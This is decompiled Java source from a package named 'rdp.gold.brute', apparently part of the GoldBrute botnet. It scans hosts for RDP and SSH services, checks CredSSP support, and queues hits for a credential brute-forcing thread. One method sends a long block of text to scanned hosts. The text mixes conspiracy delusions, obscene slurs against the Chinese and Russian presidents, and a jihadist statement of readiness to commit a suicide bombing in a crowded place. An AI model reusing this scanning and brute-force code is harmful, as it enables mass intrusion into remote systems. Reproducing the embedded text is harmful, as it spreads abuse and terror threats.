/*     */ package rdp.gold.brute.pool;
/*     */ 
/*     */ import java.io.IOException;
/*     */ import java.io.InputStream;
/*     */ import java.io.OutputStream;
/*     */ import java.io.PrintWriter;
/*     */ import java.io.StringWriter;
/*     */ import java.net.InetSocketAddress;
/*     */ import java.net.Socket;
/*     */ import java.util.List;
/*     */ import java.util.Queue;
/*     */ import java.util.concurrent.atomic.AtomicLong;
/*     */ import java.util.regex.Matcher;
/*     */ import org.apache.log4j.Logger;
/*     */ import rdp.gold.brute.Config;
/*     */ import rdp.gold.brute.CounterPool;
/*     */ import rdp.gold.brute.ResultStorage;
/*     */ import rdp.gold.brute.rdp.ByteBuffer;
/*     */ import rdp.gold.brute.rdp.Messages.ClientTpkt;
/*     */ import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
/*     */ import rdp.gold.brute.rdp.Messages.ServerTpkt;
/*     */ import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;
/*     */ import rdp.gold.brute.rdp.ServerPacketSniffer;
/*     */ 
/*     */ public class SnifferThread implements Runnable
/*     */ {
/*  27 */   public static final byte[] REQUEST_PKT = { 3, 0, 0, 51, 46, -32, 0, 0, 0, 0, 0, 67, 111, 111, 107, 105, 101, 58, 32, 109, 115, 116, 115, 104, 97, 115, 104, 61, 65, 100, 109, 105, 110, 105, 115, 116, 114, 97, 116, 111, 114, 13, 10, 1, 0, 8, 0, 1, 0, 0, 0 };
/*     */   
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*  46 */   private static final Logger logger = Logger.getLogger(SnifferThread.class);
/*  47 */   public static Queue<String> resultQueue = new java.util.concurrent.ConcurrentLinkedQueue();
/*     */   private String host;
/*     */   private String ip;
/*     */   private String port;
/*  51 */   private Boolean useCounterResults = Boolean.valueOf(false);
/*  52 */   private Boolean isSaveHost = Boolean.valueOf(false);
/*  53 */   private java.util.UUID bruteId = Config.PROJECT_ID;
/*     */   
/*     */   public static List<Integer> getPorts(String port)
/*     */     throws Exception
/*     */   {
/*     */     try
/*     */     {
/*  60 */       List<Integer> ports = new java.util.ArrayList();
/*     */       
/*  62 */       String[] portList = port.split(",");
/*     */       
/*  64 */       if (portList.length > 1) {
/*  65 */         for (String portItem : portList) {
/*  66 */           ports.add(Integer.valueOf(Integer.parseInt(portItem)));
/*     */         }
/*     */       } else {
/*  69 */         String[] portRange = port.split("-");
/*     */         
/*  71 */         if (portRange.length > 1) {
/*  72 */           int startPort = Integer.parseInt(portRange[0]);
/*  73 */           int endPort = Integer.parseInt(portRange[1]);
/*     */           
/*  75 */           for (int i = startPort; i <= endPort; i++) {
/*  76 */             ports.add(new Integer(i));
/*     */           }
/*     */         } else {
/*  79 */           ports.add(Integer.valueOf(Integer.parseInt(port)));
/*     */         }
/*     */       }
/*     */       
/*  83 */       return ports;
/*     */     } catch (Exception e) {
/*  85 */       throw new Exception("Not resolve ports; " + port + "; " + e);
/*     */     }
/*     */   }
/*     */   
/*     */   public static void sniffPkt(String host, int port, int timeoutSocket, int timeoutConnect) {
/*  90 */     Socket s = null;
/*  91 */     OutputStream os = null;
/*     */     try
/*     */     {
/*  94 */       s = new Socket();
/*  95 */       s.setSoTimeout(timeoutSocket);
/*  96 */       s.connect(new InetSocketAddress(host, port), timeoutConnect);
/*     */       
/*  98 */       os = s.getOutputStream();
/*     */       
/* 100 */       StringBuilder pkt = new StringBuilder();
/* 101 */       pkt.append("Я похищен в англии/америке/австралии 27 лет назад в скрытную секту россии и подменен двойником.\r\n");
/* 102 */       pkt.append("сектанты 27 лет удерживали в секте, скрытно контролировали, издевались, проводили исследования, подсыпали яд.\r\n");
/* 103 */       pkt.append("они запугивают и возможно планируют похищение с целью трансплантологии, сектантства или секретных исследований.\r\n");
/* 104 */       pkt.append("==================\r\n");
/* 105 */       pkt.append("Президент китая си тзинпин пидор и петух, ебать в очко, кончать в анал, петушить, опускать, обоссать.\r\n");
/* 106 */       pkt.append("Президент россии путин пидор и петух, ебать в очко, кончать в анал, петушить, опускать, обоссать.\r\n");
/* 107 */       pkt.append("==================\r\n");
/* 108 */       pkt.append("причастны россия, южная корея, китай, индия, израиль и прочие. подменено множество тел клонами управляемыми по микрочипам спец.войсками китая/южной кореи.\r\n");
/* 109 */       pkt.append("похитители применяют яды,облучатели,спец.технику,микрочипы,сектантские методы.\r\n");
/* 110 */       pkt.append("ведется беспрерывная слежка посредством сотен тысяч скрытых микрокамер и технологии не оптического получения видео.\r\n");
/* 111 */       pkt.append("данные перехватываются секретным оборудованием и изучаются в сверхмощных компьютерных центрах.\r\n");
/* 112 */       pkt.append("агент похитителей под различными прикрытиями переводит деньги в количестве расчитываемом по некой секретной формуле для типовых платежей.\r\n");
/* 113 */       pkt.append("считывается и декодируется мозговая активность.\r\n");
/* 114 */       pkt.append("Я долларовый миллиардер из англии,америки,австралии.\r\n");
/* 115 */       pkt.append("===============================================\r\n");
/* 116 */       pkt.append("Я царь.\r\n");
/* 117 */       pkt.append("похищение для кражи больших денег.\r\n");
/* 118 */       pkt.append("ядерная программа.\r\n");
/* 119 */       pkt.append("кредит индии китаю.\r\n");
/* 120 */       pkt.append("исполнители моссад,гру,корейские или китайские спецслужбы,сектанты.\r\n");
/* 121 */       pkt.append("королевские дворцы.\r\n");
/* 122 */       pkt.append("космическая марсианская программа.\r\n");
/* 123 */       pkt.append("террорист.\r\n");
/* 124 */       pkt.append("применение биологического оружия для дворцового переворота.\r\n");
/* 125 */       pkt.append("сумму переводов агент похитителей считает из связи с потреблением некой световой материи.\r\n");
/* 126 */       pkt.append("волшебство южной кореи для целей какого то мистера пака или пан ги муна.\r\n");
/* 127 */       pkt.append("мозговые микрочипы.\r\n");
/* 128 */       pkt.append("существует связь с организацией образования итон в англии.\r\n");
/* 129 */       pkt.append("нано компьютеры в теле для дистанционного управления.\r\n");
/* 130 */       pkt.append("операции с материями.\r\n");
/* 131 */       pkt.append("облучатель.\r\n");
/* 132 */       pkt.append("летающая тарелка для похищения с секретного объекта.\r\n");
/* 133 */       pkt.append("я владелец дворца крови и ключей от материи.\r\n");
/* 134 */       pkt.append("трансплантация лица.\r\n");
/* 135 */       pkt.append("пластические операции для маскировки под обычное тело.\r\n");
/* 136 */       pkt.append("подсыпали секретные вещества.\r\n");
/* 137 */       pkt.append("изготовление зелья.\r\n");
/* 138 */       pkt.append("сектанты запрещали медицинское вмешательство для всех целей.\r\n");
/* 139 */       pkt.append("сектанты прислали браслеты из дерева для рук и ног и заставили применять в течении года которые остаются в голове по прошествии 10 лет.\r\n");
/* 140 */       pkt.append("в 2014 году пропали все деньги и контакты через месяц после парашютных прыжков, деньги перевели через год в сумме 250к usd, а в 2017 году ситуация с пропажей денег и контактов повторилась.\r\n");
/* 141 */       pkt.append("связь с подземными сектантскими сооружениями.\r\n");
/* 142 */       pkt.append("сжатие материи содержащей секретные ключи для недоступности их применения в связи с бояюзнью похитителей их применения.\r\n");
/* 143 */       pkt.append("зомбирование текстом.\r\n");
/* 144 */       pkt.append("похищение с целью изготовления трансгендеров с переменой пола.\r\n");
/* 145 */       pkt.append("маньяк.\r\n");
/* 146 */       pkt.append("похищение психической энергии.\r\n");
/* 147 */       pkt.append("сектанты ограничивали связи и в неизвестном количестве подсылали агентов секты.\r\n");
/* 148 */       pkt.append("телепатическая передача образов.\r\n");
/* 149 */       pkt.append("изготовление поддельного тела каким то секретным способом вроде биоинженерии, клонирования, аппаратного производства туловищ.\r\n");
/* 150 */       pkt.append("микрочипы в глазах содержащие фотоэлементы.\r\n");
/* 151 */       pkt.append("похищение и подмена из числа участников организации образования итон в англии.\r\n");
/* 152 */       pkt.append("похищение для скрытого выпытывания секретов из днк с применением секретного оборудования.\r\n");
/* 153 */       pkt.append("причастность к ленину.\r\n");
/* 154 */       pkt.append("замечено крайне высокое влияние текста некоторых агентов секты.\r\n");
/* 155 */       pkt.append("похититель постоянно требовал деньги угрожая теми или иными действиями.\r\n");
/* 156 */       pkt.append("похищение под видом умершего с подменой тела.\r\n");
/* 157 */       pkt.append("похищение для изучения в коллайдере или для сооружения коллайдера из вымогаемых денег.\r\n");
/* 158 */       pkt.append("похититель как будто смотрит моими глазами о чем сообщает впринципе.\r\n");
/* 159 */       pkt.append("вероятна техника использующая золото как топливо для реакторов.\r\n");
/*     */       
/* 161 */       pkt.append("Ya pohishen v anglii/amerike/avstralii 27 let nazad v skrytnuyu sektu rossii i podmenen dvoinikom.\r\n");
/* 162 */       pkt.append("sektanty 27 let uderjivali v sekte, skrytno kontrolirovali, izdevalis, provodili issledovaniya, podsipali yd.\r\n");
/* 163 */       pkt.append("oni zapugivaut i vozmozhno planiruyt pohishenie s celiu transplantologii, sektantstva ili secretnih issledovaniy.\r\n");
/* 164 */       pkt.append("==================\r\n");
/* 165 */       pkt.append("President kitaya si tzinpin pidor i petuh, ebat v ochko, konchat v anal, petushit, opuskat, obossat.\r\n");
/* 166 */       pkt.append("President russia putin pidor i petuh, ebat v ochko, konchat v anal, petushit, opuskat, obossat.\r\n");
/* 167 */       pkt.append("==================\r\n");
/* 168 */       pkt.append("prichastni rossiya, ujnaya koreya, kitay, india, izrail i prochie. podmeneno mnojestvo tel klonami upravlyaemimy po microchipam spec.voiskami kitaya/ujnoy korei.\r\n");
/* 169 */       pkt.append("pohititeli primenyaut ydi,obluchateli,spec.tehniku,microchipi,sectantskie metody.\r\n");
/* 170 */       pkt.append("vedetsya besprerivnaya slejka posredstvom soten tisyach skrityh microcamer i tehnologii ne opticheskogo polucheniya video.\r\n");
/* 171 */       pkt.append("dannie perehvativautsya secretnim oborudovaniem i izuchautsya v sverhmoshnih kompiuternih centrah.\r\n");
/* 172 */       pkt.append("agent pohititeley pod razlichnimy prikritiyami perevodit dengi v kolichestve raschitivaemom po nekoy secretnoy formule dlya tipovih platejey.\r\n");
/* 173 */       pkt.append("schitivaetsya i decodirueetsya mozgovaya avkivnost.\r\n");
/* 174 */       pkt.append("Ya dollaroviy milliarder iz anglii,ameriki,avstralii.\r\n");
/* 175 */       pkt.append("===============================================\r\n");
/* 176 */       pkt.append("Ya tsar.\r\n");
/* 177 */       pkt.append("pohishenie dlya krazhi bolshih deneg.\r\n");
/* 178 */       pkt.append("yadernaya programma.\r\n");
/* 179 */       pkt.append("kredit indii kitayu.\r\n");
/* 180 */       pkt.append("isponiteli mossad,gru,koreyskie or kitayskie specslujbi,sectanty.\r\n");
/* 181 */       pkt.append("korolevskie dvorcy.\r\n");
/* 182 */       pkt.append("kosmicheskaya marsianskaya programma.\r\n");
/* 183 */       pkt.append("terrorist.\r\n");
/* 184 */       pkt.append("primenenit biologicheskogo orujia dlya dvorcovogo perevorota.\r\n");
/* 185 */       pkt.append("summu perevodov agent pohititeley schitaet iz svyazi s potrebleniem nekoy svetovoy materii.\r\n");
/* 186 */       pkt.append("volshebstvo ujnou korei dlya tseley kakogo to mistera paka ili pan gi muna.\r\n");
/* 187 */       pkt.append("mozgovie microchipy.\r\n");
/* 188 */       pkt.append("sushestvuet svyaz s organizaciey obrazovaniya iton v anglii.\r\n");
/* 189 */       pkt.append("nano computery v tele dlya distancionnogo upravleniya.\r\n");
/* 190 */       pkt.append("operacii s materiyami.\r\n");
/* 191 */       pkt.append("obluchatel.\r\n");
/* 192 */       pkt.append("letaushaya tarelka dlya pohisheniya s secretnogo objecta.\r\n");
/* 193 */       pkt.append("i vladelec dvorca krovi i kluchey ot materii.\r\n");
/* 194 */       pkt.append("transplantaciya lica.\r\n");
/* 195 */       pkt.append("plasticheskie operacii dlya maskirovki pod obichnoe telo.\r\n");
/* 196 */       pkt.append("podsipali secretnie veshestva.\r\n");
/* 197 */       pkt.append("izgotovlenie zeliya.\r\n");
/* 198 */       pkt.append("sectanty zapreshali medicinskoe vmeshatelstvo dlya vseh tseley.\r\n");
/* 199 */       pkt.append("sectanty prislali braslety iz dereva dlya ruk i nog i zastavili primenyat v techenii goda kororye ostautsya v golove po proshestvii 10 let.\r\n");
/* 200 */       pkt.append("v 2014 godu propali vse dengi i kontakry cherez mesyats posle parashutnogo pryzhka, dengi pereveli cherez god v summe 250k usd, a v 2017 godu situaciya s propajey deneg i kontaktov povtorilas.\r\n");
/* 201 */       pkt.append("svyaz s podzemnimy sectanskimi sooruzheniyami.\r\n");
/* 202 */       pkt.append("sjatie materii soderjashey secretnie kluchi dlya nedostupnosti ih primeneniya v svyazi s boyazniu pohititeley ih primeneniya.\r\n");
/* 203 */       pkt.append("zombirovanie textom.\r\n");
/* 204 */       pkt.append("pohishenie s tseliu izgotovleniya transgenderov s peremenoy pola.\r\n");
/* 205 */       pkt.append("maniak.\r\n");
/* 206 */       pkt.append("pohishenie psihicheskoy energii.\r\n");
/* 207 */       pkt.append("sectanty ogranichivali svyazi i v neizvestnom kolichestve podsilaly agentov secty.\r\n");
/* 208 */       pkt.append("telepaticheskaya peredacha obrazov.\r\n");
/* 209 */       pkt.append("izgotovleniy poddelnogo tela kakim to secretnym sposobom vrode bioinjenerii, klonirovanuya, apparatnogo proizvodstva tulovish.\r\n");
/* 210 */       pkt.append("microchipy v glazah soderjashie fotoelementy.\r\n");
/* 211 */       pkt.append("pohishenie i podmena iz chisla uchastnikov organizacii obrazovaniya iton v anglii.\r\n");
/* 212 */       pkt.append("pohishenie dlya scrytogo vipitivaniya secretov iz dnk s primeneniem secretnogo oborudovaniya.\r\n");
/* 213 */       pkt.append("prichastnost k leninu.\r\n");
/* 214 */       pkt.append("zamecheno krayne visokoe vliyanie texta nekotoryh agentov secty.\r\n");
/* 215 */       pkt.append("pohititel postoyanno treboval dengi ugrojaya temi ili inimy deystviyami.\r\n");
/* 216 */       pkt.append("pohishenie pod vidom umershego s podmenoy tela.\r\n");
/* 217 */       pkt.append("pohishenie dlya izucheniya v kollaydere ili dlya soorujeniya kollaydera iz vimogaemyh deneg.\r\n");
/* 218 */       pkt.append("pohititel kak budto smotrit moimi glazami o chem soobshaet vprincipe.\r\n");
/* 219 */       pkt.append("veroyatna tehnika ispolzuyshaya zoloto kak toplivo dlya reactorov.\r\n");
/*     */       
/* 221 */       pkt.append("I was kidnapped in england/america/australia 27 years ago in a secretive sect of Russia and replaced by a double.\r\n");
/* 222 */       pkt.append("the sectarians held the sect for 27 years, secretly controlled, mocked, conducted research, spiked poison.\r\n");
/* 223 */       pkt.append("they intimidate and possibly plan an abduction for the purpose of transplantology, sectarianism or secret research.\r\n");
/* 224 */       pkt.append("===================\r\n");
/* 225 */       pkt.append("Chinese president xi jinping fag and cock, fuck in a point, cum in anal, cock, down, piss.\r\n");
/* 226 */       pkt.append("President russia putin fag and cock, fuck at a point, cum in anal, cock, down, piss.\r\n");
/* 227 */       pkt.append("===================\r\n");
/* 228 */       pkt.append("russia, south korea, china, india, israel and others were involved. many bodies were replaced by clones of microchip-controlled special forces of china/south korea.\r\n");
/* 229 */       pkt.append("abductors use poisons, irradiators, special machinery, microchips, sectarian methods.\r\n");
/* 230 */       pkt.append("there is continuous surveillance through hundreds of thousands of hidden microcameras and non optical video acquisition technology.\r\n");
/* 231 */       pkt.append("data is intercepted by secret equipment and studied in super-power computer centers.\r\n");
/* 232 */       pkt.append("the kidnappers' agent under various coverings transfers money in the amount calculated using a certain secret formula for standard payments.\r\n");
/* 233 */       pkt.append("brain activity is read and decoded.\r\n");
/* 234 */       pkt.append("I'm a dollar billionaire from england,america,australia.\r\n");
/* 235 */       pkt.append("==============================================\r\n ");
/* 236 */       pkt.append("I am a king.\r\n");
/* 237 */       pkt.append("abduction to steal big money.\r\n");
/* 238 */       pkt.append("nuclear program.\r\n");
/* 239 */       pkt.append("india loan china.\r\n");
/* 240 */       pkt.append("mossad, gru, korean or chinese intelligence agencies, sectarians.\r\n");
/* 241 */       pkt.append("royal palaces.\r\n");
/* 242 */       pkt.append("space martian program.\r\n");
/* 243 */       pkt.append("terrorist.\r\n");
/* 244 */       pkt.append("the use of biological weapons for a palace coup.\r\n");
/* 245 */       pkt.append("the amount of transfers the agent of the kidnappers considers from the connection with the consumption of some light matter.\r\n");
/* 246 */       pkt.append("the magic of south korea for some mr pack or pan gi muna.\r\n");
/* 247 */       pkt.append("brain microchips.\r\n");
/* 248 */       pkt.append("there is a connection with the organization of education eton in england.\r\n");
/* 249 */       pkt.append("nano computers in the body for remote control.\r\n");
/* 250 */       pkt.append("operations with matters.\r\n");
/* 251 */       pkt.append("feed.\r\n");
/* 252 */       pkt.append("a flying saucer for stealing from a secret object.\r\n");
/* 253 */       pkt.append("i am the owner of the palace of blood and the keys to matter.\r\n");
/* 254 */       pkt.append("face transplant.\r\n");
/* 255 */       pkt.append("plastic operations to disguise as a normal body.\r\n");
/* 256 */       pkt.append("sprinkled secret substances.\r\n");
/* 257 */       pkt.append("making a potion.\r\n");
/* 258 */       pkt.append("sectarians forbade medical intervention for any purpose.\r\n");
/* 259 */       pkt.append("sectarians sent wood bracelets for arms and legs and forced to use for a year, which remain in my head after 10 years.\r\n");
/* 260 */       pkt.append("in 2014, all the money and contacts disappeared a month after the parachute jumps, the money was transferred a year later in the amount of 250k USD, and in 2017 the situation with the loss of money and contacts was repeated.\r\n");
/* 261 */       pkt.append("connection with underground sectarian structures.\r\n");
/* 262 */       pkt.append("compression of matter containing secret keys for the inaccessibility of their use in connection with the fear of the kidnappers of their use.\r\n");
/* 263 */       pkt.append("zombie text.\r\n");
/* 264 */       pkt.append("abduction for the purpose of making transgender people with gender reversal.\r\n");
/* 265 */       pkt.append("maniac.\r\n");
/* 266 */       pkt.append("abduction of psychic energy.\r\n");
/* 267 */       pkt.append("sectarians limited communications and sent sect agents in unknown quantity.\r\n");
/* 268 */       pkt.append("telepathic image transfer.\r\n");
/* 269 */       pkt.append("making a fake body in some secret way, like bioengineering, cloning, torso hardware.\r\n");
/* 270 */       pkt.append("microchips in the eyes containing photocells.\r\n");
/* 271 */       pkt.append("abduction and substitution from the participants of the organization of education eton in england.\r\n");
/* 272 */       pkt.append("stealing for hidden secrets from dna using secret equipment.\r\n");
/* 273 */       pkt.append("involvement in lenin.\r\n");
/* 274 */       pkt.append("noticed an extremely high influence of the text of some agents.\r\n");
/* 275 */       pkt.append("the thief is constantly demanding money threatening those or other actions.\r\n");
/* 276 */       pkt.append("abduction under the guise of the deceased with the substitution of the body.\r\n");
/* 277 */       pkt.append("kidnapping to study in a collider or to build a collider from extorted money.\r\n");
/* 278 */       pkt.append("the thief seems to be watching with my eyes about what he reports in principle.\r\n");
/* 279 */       pkt.append("likely technology using gold as fuel for reactors.\r\n");
/*     */       
/* 281 */       pkt.append("****************************************************************************************************\r\n");
/*     */       
/* 283 */       pkt.append("Я террорист джихадского толка и готов совершить самоподрыв в людном месте.\r\n");
/* 284 */       pkt.append("Трупы мне требуются богатые в крупном количестве, я не меценат взрывать нищих и больных.\r\n");
/* 285 */       pkt.append("Требуются богатые трупы в крупном количестве я могу взрываться.\r\n");
/*     */       
/* 287 */       pkt.append("Ya terrorist djihadskogo tolka i gotov sovershit samopodryv v ludnom meste.\r\n");
/* 288 */       pkt.append("Trupy mne trebuytsya bogatye v krupnom kolichestve, ya ne mecenat vzrivat nishih i bolnih.\r\n");
/* 289 */       pkt.append("Trebuytsya bogatye trupy v krupnom kolichestve ya mogu vzrivatsya.\r\n");
/*     */       
/* 291 */       pkt.append("I am a jihadist terrorist and I am ready to commit a self-bombing in a crowded place.\r\n");
/* 292 */       pkt.append("I need rich people in large quantities, I am not a philanthropist to blow up the poor and the sick.\r\n");
/* 293 */       pkt.append("Wanted rich corpses in large quantities, I can explode.\r\n");
/*     */       
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 302 */       os.write(pkt.toString().getBytes(java.nio.charset.Charset.forName("UTF-8")));
/* 303 */       os.flush();
/*     */       StringWriter sw;
/*     */       return;
/* 306 */     } catch (Exception e) { sw = new StringWriter();
/* 307 */       e.printStackTrace(new PrintWriter(sw));
/* 308 */       logger.error(e.getMessage() + sw.toString());
/*     */     } finally {
/*     */       try {
/* 311 */         if (s != null)
/* 312 */           s.close();
/*     */       } catch (IOException e) {
/* 314 */         logger.error(e);
/*     */       }
/*     */     }
/*     */   }
/*     */   
/*     */ 
/*     */   public static boolean sniff(String host, int port)
/*     */   {
/* 322 */     return sniff(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue());
/*     */   }
/*     */   
/*     */   public static boolean sniff(String host, int port, int timeoutSocket, int timeoutConnect) {
/* 326 */     Socket s = null;
/* 327 */     OutputStream os = null;
/* 328 */     InputStream is = null;
/*     */     try
/*     */     {
/* 331 */       s = new Socket();
/* 332 */       s.setSoTimeout(timeoutSocket);
/* 333 */       s.connect(new InetSocketAddress(host, port), timeoutConnect);
/*     */       
/* 335 */       os = s.getOutputStream();
/* 336 */       is = s.getInputStream();
/*     */       
/* 338 */       ClientTpkt clientTpkt = new ClientTpkt();
/* 339 */       ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU("Almaz", 2);
/*     */       
/* 341 */       ByteBuffer bufferReq = clientX224ConnectionRequestPDU.proccessPacket(null);
/* 342 */       clientTpkt.proccessPacket(bufferReq);
/* 343 */       bufferReq.rewindCursor();
/*     */       
/* 345 */       os.write(bufferReq.data, bufferReq.offset, bufferReq.length);
/* 346 */       os.flush();
/*     */       
/* 348 */       ByteBuffer bufferRes = new ByteBuffer(-1);
/* 349 */       int actualLength = is.read(bufferRes.data, bufferRes.offset, bufferRes.data.length - bufferRes.offset);
/*     */       
/* 351 */       if (actualLength <= 0) {
/* 352 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*     */       }
/*     */       
/* 355 */       bufferRes.length = actualLength;
/* 356 */       bufferRes.rewindCursor();
/* 357 */       bufferRes.ref();
/*     */       
/* 359 */       ServerTpkt serverTpkt = new ServerTpkt();
/* 360 */       bufferRes = serverTpkt.proccessPacket(bufferRes);
/*     */       
/* 362 */       ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
/* 363 */       serverX224ConnectionConfirmPDU.proccessPacket(bufferRes);
/*     */       
/* 365 */       return true;
/*     */     }
/*     */     catch (Exception localException) {}finally
/*     */     {
/*     */       try {
/* 370 */         if (s != null)
/* 371 */           s.close();
/*     */       } catch (IOException e) {
/* 373 */         logger.error(e);
/*     */       }
/*     */     }
/*     */     
/* 377 */     return false;
/*     */   }
/*     */   
/*     */ 
/*     */   public static boolean sniffSSH(String host, int port)
/*     */   {
/* 383 */     return sniffSSH(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue());
/*     */   }
/*     */   
/*     */   private static boolean sniffSSH(String host, int port, int timeoutSocket, int timeoutConnect) {
/* 387 */     Socket s = null;
/* 388 */     OutputStream os = null;
/* 389 */     InputStream is = null;
/*     */     try
/*     */     {
/* 392 */       s = new Socket();
/* 393 */       s.setSoTimeout(timeoutSocket);
/* 394 */       s.connect(new InetSocketAddress(host, port), timeoutConnect);
/*     */       
/* 396 */       os = s.getOutputStream();
/* 397 */       is = s.getInputStream();
/*     */       
/* 399 */       ByteBuffer buffer = new ByteBuffer(-1);
/* 400 */       int actualLength = is.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/* 401 */       buffer.length = actualLength;
/* 402 */       buffer.rewindCursor();
/*     */       
/* 404 */       boolean isSSH = buffer.dump().toLowerCase().contains("ssh");
/*     */       
/* 406 */       if (isSSH) {
/* 407 */         logger.info("Sniffed brute.ssh service in " + host + ":" + 3389);
/*     */       }
/*     */       else {
/* 410 */         logger.info("Not found brute.ssh service in " + host + ":" + 3389);
/*     */       }
/*     */       
/* 413 */       return isSSH;
/*     */     }
/*     */     catch (Exception e) {
/* 416 */       logger.error(e);
/*     */     }
/*     */     finally {
/*     */       try {
/* 420 */         if (s != null) {
/* 421 */           s.close();
/*     */         }
/*     */       }
/*     */       catch (IOException e) {
/* 425 */         logger.error(e);
/*     */       }
/*     */       try
/*     */       {
/* 429 */         if (os != null) {
/* 430 */           os.close();
/*     */         }
/*     */       }
/*     */       catch (IOException e) {
/* 434 */         logger.error(e);
/*     */       }
/*     */       try
/*     */       {
/* 438 */         if (is != null) {
/* 439 */           is.close();
/*     */         }
/*     */       }
/*     */       catch (IOException e) {
/* 443 */         logger.error(e);
/*     */       }
/*     */     }
/*     */     
/* 447 */     return false;
/*     */   }
/*     */   
/*     */   public static boolean sniffTest(String host, int port, int timeoutSocket, int timeoutConnect) {
/* 451 */     Socket s = null;
/* 452 */     OutputStream os = null;
/* 453 */     InputStream is = null;
/*     */     try
/*     */     {
/* 456 */       s = new Socket();
/* 457 */       s.setSoTimeout(timeoutSocket);
/* 458 */       s.connect(new InetSocketAddress(host, port), timeoutConnect);
/*     */       
/* 460 */       os = s.getOutputStream();
/* 461 */       is = s.getInputStream();
/*     */       
/* 463 */       os.write(REQUEST_PKT);
/* 464 */       os.flush();
/*     */       
/* 466 */       ByteBuffer buffer = new ByteBuffer(19);
/* 467 */       int actualLength = is.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/* 468 */       buffer.length = actualLength;
/*     */       
/* 470 */       ServerPacketSniffer serverPacketSniffer = new ServerPacketSniffer("sniffer");
/* 471 */       boolean isRdp = serverPacketSniffer.matchX224ConnectionRequest(buffer);
/* 472 */       if (isRdp) {}
/*     */       
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 478 */       return isRdp;
/*     */     }
/*     */     catch (Exception e) {
/* 481 */       StringWriter sw = new StringWriter();
/* 482 */       e.printStackTrace(new PrintWriter(sw));
/* 483 */       logger.error(e.getMessage() + sw.toString());
/*     */     } finally {
/*     */       try {
/* 486 */         if (s != null)
/* 487 */           s.close();
/*     */       } catch (IOException e) {
/* 489 */         logger.error(e);
/*     */       }
/*     */     }
/*     */     
/* 493 */     return false;
/*     */   }
/*     */   
/*     */   public void run() {
/*     */     try {
/* 498 */       String host = null;
/*     */       for (;;)
/*     */       {
/* 501 */         if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_SCAN.get())) {
/* 502 */           return;
/*     */         }
/*     */         
/* 505 */         boolean isRun = false;
/*     */         try
/*     */         {
/* 508 */           host = (String)GoldBrute.getTaskScanQueue().poll();
/*     */           
/* 510 */           if (host != null) {
/* 511 */             parseHost(host);
/* 512 */             isRun = true;
/*     */             
/* 514 */             CounterPool.poolUsed.incrementAndGet();
/*     */             
/* 516 */             for (Integer portSniffer : getPorts()) {
/* 517 */               boolean isValid = false;
/* 518 */               for (int i = 1; i <= Config.SCAN_CNT_ATTEMPTS.intValue(); i++) {
/* 519 */                 if (Config.SCAN_TYPE.intValue() == 1) {
/* 520 */                   if (sniff(this.ip, portSniffer.intValue())) {
/* 521 */                     isValid = true;
/*     */                     
/* 523 */                     CounterPool.sniffedPorts.incrementAndGet();
/* 524 */                     CounterPool.countX224RDP.incrementAndGet();
/*     */                     
/* 526 */                     if (Config.SCAN_IS_BRUTABLE.booleanValue()) {
/* 527 */                       BruteThread bruteThread = new BruteThread();
/* 528 */                       isValid = bruteThread.isCredSsp(this.ip, portSniffer.intValue());
/*     */                       
/* 530 */                       if (isValid) {
/* 531 */                         CounterPool.countCredSSPRDP.incrementAndGet();
/*     */                       }
/*     */                     }
/*     */                     
/* 535 */                     if (!isValid) break;
/* 536 */                     String saveSuccess = this.ip + ":" + portSniffer;
/*     */                     
/* 538 */                     if (!this.useCounterResults.booleanValue()) {
/* 539 */                       ResultStorage.saveSuccess(saveSuccess);
/*     */                     } else {
/* 541 */                       resultQueue.add(saveSuccess);
/*     */                     }
/* 543 */                     break;
/*     */                   }
/*     */                   
/*     */ 
/*     */                 }
/* 548 */                 else if ((Config.SCAN_TYPE.intValue() == 2) && 
/* 549 */                   (sniffSSH(this.ip, portSniffer.intValue()))) {
/* 550 */                   CounterPool.sniffedPorts.incrementAndGet();
/*     */                   
/* 552 */                   String saveSuccess = this.ip + ":" + portSniffer;
/*     */                   
/* 554 */                   if (!this.useCounterResults.booleanValue()) {
/* 555 */                     ResultStorage.saveSuccess(saveSuccess); break;
/*     */                   }
/* 557 */                   resultQueue.add(saveSuccess);
/*     */                   
/*     */ 
/* 560 */                   break;
/*     */                 }
/*     */               }
/*     */               
/*     */ 
/* 565 */               if ((!this.useCounterResults.booleanValue()) && 
/* 566 */                 (!isValid) && (Config.SCAN_SAVE_INVALID.booleanValue())) {
/* 567 */                 String saveInvalid = this.ip + ":" + portSniffer;
/* 568 */                 ResultStorage.saveInvalid(saveInvalid);
/*     */               }
/*     */             }
/*     */             
/*     */ 
/* 573 */             if (!this.useCounterResults.booleanValue()) {
/* 574 */               CounterPool.scannedIps.incrementAndGet();
/*     */             }
/*     */           }
/*     */         } catch (Exception e) {
/* 578 */           StringWriter sw = new StringWriter();
/* 579 */           e.printStackTrace(new PrintWriter(sw));
/*     */           
/* 581 */           logger.error(e.getMessage() + sw.toString());
/*     */         } finally {
/* 583 */           if (isRun) {
/* 584 */             CounterPool.poolUsed.decrementAndGet();
/*     */           }
/*     */         }
/*     */         
/* 588 */         if (host == null) {
/*     */           try {
/* 590 */             Thread.sleep(200L);
/*     */           }
/*     */           catch (InterruptedException localInterruptedException1) {}
/*     */         }
/*     */       }
/*     */       
/*     */ 
/*     */ 
/*     */       StringWriter sw;
/*     */       
/*     */ 
/* 601 */       return;
/*     */     }
/*     */     catch (Exception e)
/*     */     {
/* 596 */       sw = new StringWriter();
/* 597 */       e.printStackTrace(new PrintWriter(sw));
